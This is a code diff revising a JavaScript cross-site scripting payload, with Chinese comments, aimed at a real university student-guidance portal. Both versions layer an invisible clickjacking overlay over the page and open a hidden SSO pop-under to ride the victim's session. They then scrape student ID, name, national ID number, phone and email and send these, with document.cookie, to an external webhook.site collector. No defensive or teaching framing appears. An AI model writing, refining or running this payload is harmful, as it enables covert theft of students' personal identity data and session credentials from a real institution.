@@ -1,152 +1,135 @@
 (async () => {
-    // 攻擊者控制的接收端
+    // === 設定 ===
     const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
-    
-    // SSO 認證 URL
     const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
+    // 假設這是相對於 iframe 當前域名的路徑
+    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
+
+    // === 工具函數 ===
     
-    // 目標數據 API (假設在 ap.itc 域下，即同源)
-    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI"; 
-
-    /**
-     * 擴大攻擊面：將當前 iframe 擴展至全屏並透明化
-     * 這確保了使用者在頁面上的任何點擊都會被我們捕獲
-     */
-    function expandIframe() {
+    // 1. CORS 繞過日誌記錄器 (射後不理)
+    // 使用 Image 物件發送 GET 請求，不會觸發 CORS 阻擋
+    const log = (msg) => {
         try {
-            // 嘗試修改當前 iframe 的樣式 (如果父頁面允許)
-            // 注意：如果跨域，無法直接修改父頁面的 DOM 來調整 iframe 大小。
-            // 但如果我們是在 iframe 內部執行，我們可以嘗試讓自己看起來很大。
-            // 更好的方式是：如果 XSS 允許我們注入 HTML，我們應該注入一個全屏的 div 覆蓋層。
-            
-            // 在 iframe 內部創建一個全屏透明按鈕
-            const overlay = document.createElement('div');
-            overlay.style.position = 'fixed';
-            overlay.style.top = '0';
-            overlay.style.left = '0';
-            overlay.style.width = '100vw';
-            overlay.style.height = '100vh';
-            overlay.style.zIndex = '999999';
-            overlay.style.background = 'transparent'; // 透明
-            overlay.style.cursor = 'default'; // 保持鼠標樣式，不讓用戶起疑
-            overlay.id = 'click-jacker';
-            document.body.appendChild(overlay);
-            
-            console.log("Overlay created for click interception.");
-        } catch (e) {
-            console.error("Failed to expand attack surface:", e);
-        }
-    }
-
-    /**
-     * 嘗試使用隱藏 iframe 進行靜默認證
-     * 如果成功，使用者完全無感
-     */
-    function trySilentAuth() {
-        return new Promise((resolve) => {
-            const hiddenFrame = document.createElement('iframe');
-            hiddenFrame.style.display = 'none';
-            hiddenFrame.src = ssoUrl;
-            document.body.appendChild(hiddenFrame);
-            
-            // 給它一點時間加載
-            setTimeout(() => {
-                // 無法準確判斷跨域 iframe 是否加載完成，只能基於時間猜測
-                resolve(true);
-            }, 5000); 
-        });
-    }
-
-    /**
-     * 執行攻擊的主邏輯
-     */
-    async function executeExploit() {
-        // 1. 先嘗試靜默認證
-        // fetch(webhook + "?status=Attempting_Silent_Auth");
-        // await trySilentAuth();
-
-        // 2. 檢查是否已經有數據 (如果靜默認證成功)
-        try {
-            const checkResp = await fetch(targetUrl);
-            if (checkResp.ok && !checkResp.redirected) { // 簡單判斷是否已登入
-                 const data = await checkResp.text();
-                 if (data.includes("學生學號")) { // 簡單特徵匹配
-                     exfiltrateData(data, "Silent_Auth");
-                     return; // 成功，結束
-                 }
-            }
+            new Image().src = `${webhook}?log=${encodeURIComponent(msg)}&t=${Date.now()}`;
         } catch(e) {}
+    };
 
-        // 3. 如果靜默失敗，則部署點擊劫持
-        fetch(webhook + "?status=Silent_Failed_Deploying_Clickjack");
-        expandIframe();
+    // 2. 數據外傳器
+    // 使用 no-cors 模式的 fetch 發送 JSON 數據
+    const exfiltrate = (data) => {
+        try {
+            const payload = JSON.stringify(data);
+            // 優先使用 navigator.sendBeacon (更可靠)
+            if (navigator.sendBeacon) {
+                const blob = new Blob([payload], {type: 'text/plain'});
+                navigator.sendBeacon(webhook, blob);
+            } else {
+                // 回退方案
+                fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors', // 關鍵：忽略跨域回應
+                    headers: {'Content-Type': 'text/plain'}, // 避免觸發 Preflight
+                    body: payload
+                });
+            }
+            log("Exfiltration_Sent");
+        } catch (e) {
+            log("Exfil_Error_" + e.message);
+        }
+    };
 
-        const clickHandler = async (e) => {
-            // 移除覆蓋層，恢復正常交互，避免用戶生疑
-            const overlay = document.getElementById('click-jacker');
-            if (overlay) overlay.remove();
+    // === 攻擊流程 ===
+
+    async function executeAttack() {
+        log("Script_Started");
+
+        // 步驟 1: 建立隱形覆蓋層 (點擊劫持)
+        const overlay = document.createElement('div');
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0); 
+            z-index: 2147483647; /* 最大整數值 */
+            cursor: default;
+        `;
+        overlay.id = 'security_check_overlay'; // 取個無害的 ID
+        document.body.appendChild(overlay);
+        
+        log("Overlay_Deployed_Waiting_For_Click");
+
+        // 步驟 2: 定義觸發器 (一次性事件)
+        const clickHandler = async (event) => {
+            // 立即移除覆蓋層，讓使用者之後能正常操作
+            overlay.remove();
             
-            // 觸發彈窗認證
-            const popup = window.open(ssoUrl, "sso_auth", "width=100,height=100,left=-9999,top=-9999");
+            log("User_Clicked_Initiating_Auth");
+
+            // 步驟 3: 觸發 SSO 彈窗 (Pop-under)
+            // 嘗試將視窗開在螢幕外
+            const popup = window.open(ssoUrl, "sso_auth_window", "width=100,height=100,left=-1000,top=-1000");
+            
             if (popup) {
+                // 嘗試讓彈窗失焦，主視窗聚焦
                 try { popup.blur(); window.focus(); } catch(e) {}
-                fetch(webhook + "?status=Popup_Launched");
                 
-                // 等待認證完成
-                await new Promise(r => setTimeout(r, 6000));
+                // 等待 5 秒讓 SSO 重定向流程跑完
+                await new Promise(r => setTimeout(r, 5000));
+                
+                // 關閉彈窗
                 try { popup.close(); } catch(e) {}
-                
-                // 再次嘗試獲取數據
+                log("Popup_Closed_Fetching_Data");
+
+                // 步驟 4: 獲取受害者數據
                 try {
                     const response = await fetch(targetUrl);
-                    const html = await response.text();
-                    exfiltrateData(html, "Popup_Auth");
-                } catch (err) {
-                    fetch(webhook + "?error=" + encodeURIComponent(err.message));
+                    const text = await response.text();
+
+                    // 步驟 5: 解析數據
+                    let info = {};
+                    try {
+                        const clean = (str) => str ? str.replace(/<[^>]+>/g, '').trim() : "N/A";
+                        // 使用正則抓取標籤後的內容
+                        info.studentId = clean(text.match(/學生學號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                        info.name = clean(text.match(/學生姓名:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                        info.idCard = clean(text.match(/身分證字號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                        info.phone = clean(text.match(/手機:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                        info.email = clean(text.match(/E-mail:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                    } catch (parseErr) {
+                        log("Parse_Error");
+                    }
+
+                    // 步驟 6: 回傳數據
+                    exfiltrate({
+                        status: "SUCCESS",
+                        data: info,
+                        cookie: document.cookie,
+                        // 可選：回傳部分 HTML 以供調試 (前 1000 字)
+                        partial_source: text.substring(0, 1000) 
+                    });
+
+                } catch (fetchErr) {
+                    log("Fetch_Error_" + fetchErr.message);
                 }
+
             } else {
-                fetch(webhook + "?error=Popup_Blocked_User_Interaction_Required");
+                log("Popup_Blocked");
             }
         };
 
-        // 綁定到我們創建的全屏覆蓋層
-        const overlay = document.getElementById('click-jacker');
-        if (overlay) {
-            overlay.addEventListener('click', clickHandler, { once: true });
-        } else {
-            document.addEventListener('click', clickHandler, { once: true });
-        }
+        // 將監聽器綁定到覆蓋層
+        overlay.addEventListener('click', clickHandler, { once: true });
     }
 
-    /**
-     * 數據提取與外傳
-     */
-    function exfiltrateData(html, method) {
-        let info = {};
-        try {
-            // 正則提取邏輯保持不變，或根據實際 HTML 結構微調
-            info.studentId = html.match(/學生學號:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
-            info.name = html.match(/學生姓名:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
-            info.idCard = html.match(/身分證字號:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
-            info.phone = html.match(/手機:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
-            info.email = html.match(/E-mail:[\s\S]*?class="form-control-static">([^<]+)/)?.[1]?.trim();
-        } catch(e) {}
-
-        fetch(webhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                status: "SUCCESS",
-                method: method,
-                extracted_data: info,
-                raw_html_snippet: html.substring(0, 2000), // 截取前 2000 字符避免過大
-                cookie_dump: document.cookie
-            })
-        });
+    // 執行
+    try {
+        executeAttack();
+    } catch(e) {
+        // 最後一道防線的錯誤回報
+        new Image().src = webhook + "?fatal_error=" + encodeURIComponent(e.message);
     }
-
-    // 啟動
-    executeExploit();
 
 })();
